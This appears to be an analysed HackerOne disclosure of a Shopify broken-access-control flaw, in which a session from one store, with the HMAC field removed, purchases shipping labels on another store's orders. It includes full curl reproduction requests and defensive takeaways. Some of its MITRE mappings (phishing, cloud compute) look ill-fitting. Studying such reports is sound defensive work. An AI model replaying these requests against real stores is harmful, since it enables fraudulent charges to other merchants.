# Cross-Store Shipping Label Generation via Session Manipulation

## Metadata
- **Source:** HackerOne
- **Report:** 884159 | https://hackerone.com/reports/884159
- **Submitted:** 2020-05-28
- **Reporter:** imgnotfound
- **Program:** Shopify
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Broken Access Control, Insufficient Session Validation, Insecure Direct Object Reference (IDOR), Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
A shop owner can generate shipping labels for orders in another store they do not have access to by manipulating the sessionId parameter and removing HMAC validation. An attacker creates a session on their own store, then reuses it to craft requests targeting victim store orders, bypassing authorization checks.

## Attack scenario
1. Attacker (Shop B owner) identifies a target store (Shop A) and locates an unfulfilled order with ID
2. Attacker creates a valid session on their own store (Shop B) by calling /session/authentication and obtains a sessionId
3. Attacker captures the GraphQL mutation structure from a legitimate label creation request in Shop B
4. Attacker modifies the request to target Shop A's shipping label by changing the ShippingLabel GID and removing the HMAC validation parameter
5. Attacker replaces the sessionId with their Shop B session token and sends the malicious request to mailbox.shopifycloud.com
6. The server processes the request without properly validating that the sessionId belongs to the store owner of the target order, allowing label generation in Shop A

## Root cause
The mailbox.shopifycloud.com service relies on sessionId for authentication but fails to validate that the authenticated session's store matches the store owning the target shipping label. HMAC validation is not enforced server-side, allowing attackers to omit it. The service does not perform store ownership verification before processing shipping label mutations.

## Attacker mindset
An attacker with a legitimate Shopify store can exploit authorization flaws to access and manipulate resources in other stores. By understanding the GraphQL mutation structure and session handling, they can generate fraudulent shipping labels, potentially causing financial loss to victims through label cost charges or order fulfillment disruption.

## Defensive takeaways
- Implement server-side store ownership validation for all shipping label operations before processing mutations
- Enforce HMAC signature validation on all requests; never rely solely on client-side removal
- Use cryptographically bound session tokens that include store context and cannot be reused across different shops
- Implement rate limiting and anomaly detection for label creation requests from sessions
- Add audit logging for all shipping label operations including session ID, timestamp, and originating store
- Apply principle of least privilege: sessions should only grant access to resources owned by that shop
- Validate request origin headers and implement CSRF protections for state-changing operations
- Use opaque session identifiers that cannot be predicted or manipulated

## Variant hunting
Test other Shopify microservices (fulfillment, inventory, payments) for similar session reuse vulnerabilities
Check if HMAC can be removed from other GraphQL mutations beyond shipping labels
Investigate whether sessionId can be used across different Shopify APIs or services
Test if modifying other GID object references (orders, products, customers) yields similar bypass results
Examine whether shop context is properly validated in cross-origin requests to mailbox.shopifycloud.com
Attempt to use another user's sessionId to access different store resources

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1548 - Abuse Elevation Control Mechanism
- T1566 - Phishing
- T1578 - Modify Cloud Compute Infrastructure

## Notes
The vulnerability demonstrates a classic authorization flaw where the service authenticates a user but fails to authorize their access to specific resources. The removal of HMAC validation in step 6 suggests weak server-side security posture. The cross-origin nature (CORS) combined with inadequate session scoping creates a severe risk. Shopify's bug bounty response time and patch deployment should be reviewed. This affects the critical shipping functionality that could result in financial loss and operational disruption for affected store owners.

## Full report
<details><summary>Expand</summary>

## Details
A shop owner creating a session on its own store on https://mailbox.shopifycloud.com/ service can craft request to print labels on another store he doesn't have access to.

## Steps to reproduce
1. Go to an unfulfilled order and click on **Create a shipping label**
2. Copy the CURL request that is being made to https://mailbox.shopifycloud.com/graphql/labels?sessionId={{sessionId}}. The payload should look like 
```
 curl 'https://mailbox.shopifycloud.com/graphql/labels?sessionId=4e8da4a36b' \
  -H 'authority: mailbox.shopifycloud.com' \
  -H 'cache-control: max-age=0' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \
  -H 'origin: https://fbeaudoinplus01.myshopify.com' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'accept-language: en-US,en;q=0.9' \
  --data-binary $'{"query":"mutation PurchaseShippingLabels($shippingLabelPurchaseRequests:[ShippingLabelPurchaseRequestInput\u0021]\u0021){purchaseShippingLabels(shippingLabelPurchaseRequests:$shippingLabelPurchaseRequests){shippingLabelId status notices{code severity message shippingLabelId carrierCode serviceCode serviceName __typename}__typename}}","variables":{"shippingLabelPurchaseRequests":[{"shippingLabelId":"gid://shopify/ShippingLabel/522221879427", "hmac": "5TjRpa34as7d34OPPEhneeu4723=", "shippingRateSelection":{"carrierCode":"canada_post","serviceCode":"DOM.EP","serviceName":"Expedited Parcel","quotedCost":{"amount":7.91,"currencyCode":"CAD"},"shipmentOptions":[]},"destinationAddress":{"name":"Francis Beaudoinn","address1":"25-838 Rue Grandjean","address2":"","city":"Québec","province":"QC","postalCode":"G1X 3W5","country":"CA","phone":"","company":"&gt;"},"weight":0.00001,"weightUnit":"kg","selectedPackage":{"name":"Sample box","key":"gid://shopify/ShippingPackageV2/46497464451","type":"box","length":35,"width":26,"height":5,"dimensionUnit":"cm","weight":0,"weightUnit":"kg"},"lineItems":[{"lineItemId":"gid://shopify/LineItem/4975517728899","quantity":1}],"customsLineItems":[{"description":"test","quantity":1,"value":0,"weight":0,"weightUnit":"kg","countryOfOrigin":"","provinceOfOrigin":null,"hsCode":"","inventoryItemId":null}],"shippingDate":"2020-05-27","customerNotificationDate":"2020-05-27"}]},"operationName":"PurchaseShippingLabels"}' \
  --compressed
```

3. Void the shipping label
4. Re-open the order and click again on **Create a shipping label** and take note of the `shipping_label_ids` from the URL
5. We'll now re-send the request as the attacker, you'll need to use another shop Owner account (different shop). First of, we'll be initiating a session to the service by making the following request. Make sure to update the `{shop}` placeholder in the `Origin` header with your own shop name.
```
curl 'https://mailbox.shopifycloud.com/session/authentication' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: */*' \
  -H 'Origin: https://{shop}.myshopify.com' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --compressed
```
From the response payload, copy the `redirectUrl` value and open it up in your browser. Click the install button then you should now be redirected to a page that contains a JSON payload i.e.: `{"id": "abc", "status":"success"}`. Take note of the `id` value.

6. From the CURL request in step 2:
 - Change the `gid://shopify/ShippingLabel/` object id with the one from Step 2
 - Change the `sessionId` query parameter to the previous step `id` value. i.e.: `abc`
 - Change the cookie `session` value to the same `id` value. i.e.: `abc`
 - Remove the `hmac` property from the payload

7. Send the CURL request and go back to the order, a new label has been generated.

## Demo
█████

## Impact

I am not sure of the impact as I didn't make too many tests except the one described here but at least, it demonstrates that an attacker is able to create a session on his own store and make requests to other stores he doesn't have access to.

</details>

---
*Analysed by Claude on 2026-05-24*
